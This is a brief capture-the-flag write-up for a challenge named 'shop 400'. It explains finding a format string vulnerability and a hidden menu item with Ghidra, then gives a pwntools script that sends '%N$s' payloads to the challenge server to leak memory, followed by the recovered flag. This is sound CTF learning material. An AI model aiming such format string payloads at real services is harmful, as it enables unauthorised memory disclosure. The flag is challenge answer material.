# shop 400
#### go on, maybe buy a playlist
#### nc 195.154.231.70 4343

[f](https://github.com/gamer-1478/unreal-ctf/blob/main/f)


[inspiration](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
(A much better writeup)

using lead confirmations i was able to find out that this involes a format string attack. seeing that it uses printf directly on our input, i wrote a little script to expose all characters from 0,90. 
using ghidra we can see a hidden menu item of 1337 biscuits which loads flag into memory. 
writing a script accordingly.

```py
from pwn import *

host,port = '195.154.231.70', 4343

for i in range(90):
    print(i)
    s = remote(host,port)
    s.recvuntil(b'choice:')
    s.sendline(b"1337")
    s.sendline('%' + str(i) + '$s')
    print(s.recvuntil(b'at:'))
    print(i), print(s.recv())
    s.close
```

```
flag - unreal{s1_w4nn4_533_y0ur_50lv3_5cr1p7}
```
